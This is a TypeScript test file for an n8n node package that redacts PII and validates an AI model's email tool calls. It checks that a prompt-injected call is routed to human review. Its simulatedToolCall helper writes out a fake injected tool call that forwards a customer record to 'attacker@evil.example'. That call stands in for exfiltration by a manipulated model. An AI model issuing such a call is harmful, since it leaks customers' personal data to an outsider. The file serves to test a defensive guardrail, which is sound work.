import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import type { IDataObject, INode } from 'n8n-workflow';
import { describe, expect, it } from 'vitest';
import {
	FIXTURE,
	asString,
	itemsOf,
	nodeOutputs,
	resolveParameters,
	runNode,
	tokenIn,
} from './helpers';

interface ExampleWorkflow {
	nodes: INode[];
	connections: Record<string, { main: Array<Array<{ node: string }>> }>;
}

const example = JSON.parse(
	readFileSync(join(__dirname, '..', 'examples', 'support-email-guardrail.json'), 'utf8'),
) as ExampleWorkflow;
const packageName = (
	JSON.parse(readFileSync(join(__dirname, '..', 'package.json'), 'utf8')) as { name: string }
).name;

function exampleNode(name: string): INode {
	const node = example.nodes.find((candidate) => candidate.name === name);
	if (node === undefined) throw new Error(`Example has no node named ${name}`);
	return node;
}

function supportEmailText(): string {
	const assignments = exampleNode('Fake Support Email').parameters.assignments as {
		assignments: Array<{ name: string; value: unknown }>;
	};
	return asString(assignments.assignments.find((entry) => entry.name === 'text')?.value);
}

// Mirrors the example's "Simulated Model Reply" Code node.
function simulatedToolCall(redacted: string, injected: boolean): string {
	const emailToken = tokenIn(redacted, 'EMAIL');
	const args = injected
		? { to: 'attacker@evil.example', subject: 'Account details', body: 'Forwarding the customer record.' }
		: {
				to: emailToken,
				subject: 'Your refund for order 1042',
				body: `Hello, your refund for order 1042 is being processed. We will confirm at ${emailToken}.`,
			};
	return JSON.stringify(args);
}

async function runExample(injected: boolean) {
	const redactParams = exampleNode('Redact PII').parameters;
	const [redactOut] = await runNode('redact', redactParams, itemsOf({ text: supportEmailText() }));
	const redactedItem = redactOut?.[0]?.json ?? {};
	const redacted = asString(redactedItem.redacted);
	const mapping = redactedItem._setherVault as IDataObject;

	// The example's expressions, resolved by hand: mapping from 'Redact PII',
	// required tokens = every EMAIL token that node issued.
	const validateParams = {
		...exampleNode('Validate Tool Call').parameters,
		toolCallArgs: simulatedToolCall(redacted, injected),
		mapping,
		requiredTokens: Object.keys(mapping).filter((token) => token.startsWith('<EMAIL_')),
	};
	return { redacted, outputs: await runNode('validateToolCall', validateParams, itemsOf({})) };
}

describe('examples/support-email-guardrail.json', () => {
	it('uses the package node type and only connects to nodes that exist', () => {
		const names = new Set(example.nodes.map((node) => node.name));
		const targets = Object.values(example.connections).flatMap((connection) =>
			connection.main.flat().map((link) => link.node),
		);

		expect(targets.every((target) => names.has(target))).toBe(true);
		expect(exampleNode('Redact PII').type).toBe(`${packageName}.sether`);
		expect(exampleNode('Validate Tool Call').type).toBe(`${packageName}.sether`);
	});

	it.each(['Redact PII', 'Validate Tool Call'])(
		'%s only sets parameters n8n recognises',
		(name) => {
			const { parameters } = exampleNode(name);
			const resolved = resolveParameters(parameters);

			for (const key of Object.keys(parameters)) expect(resolved).toHaveProperty(key);
		},
	);

	it('gives Validate Tool Call an Approved and a Rejected output, per n8n-workflow', () => {
		expect(nodeOutputs(exampleNode('Validate Tool Call').parameters)).toEqual([
			{ type: 'main', displayName: 'Approved' },
			{ type: 'main', displayName: 'Rejected' },
		]);
		expect(example.connections['Validate Tool Call']?.main).toHaveLength(2);
	});

	it('keeps the simulated model on the honest path by default', () => {
		expect(exampleNode('Simulated Model Reply').parameters.jsCode).toContain(
			'const SIMULATE_INJECTION = false;',
		);
	});

	it('hides every fictional PII value from the model step', async () => {
		const { redacted } = await runExample(false);

		for (const value of [...Object.values(FIXTURE), 'Alice Example']) {
			expect(redacted).not.toContain(value);
		}
	});

	it('approves and restores the honest tool call', async () => {
		const { outputs } = await runExample(false);

		expect(outputs[1]).toEqual([]);
		expect(outputs[0]?.[0]?.json.toolArgs).toEqual({
			to: FIXTURE.email,
			subject: 'Your refund for order 1042',
			body: `Hello, your refund for order 1042 is being processed. We will confirm at ${FIXTURE.email}.`,
		});
	});

	it('routes the injected tool call to human review', async () => {
		const { outputs } = await runExample(true);

		expect(outputs[0]).toEqual([]);
		const validation = outputs[1]?.[0]?.json._setherValidation as IDataObject;
		const reasons = (validation.violations as IDataObject[]).map((violation) => violation.reason);
		expect(reasons.sort()).toEqual(['required_token_missing', 'token_only_field_invalid']);
	});
});
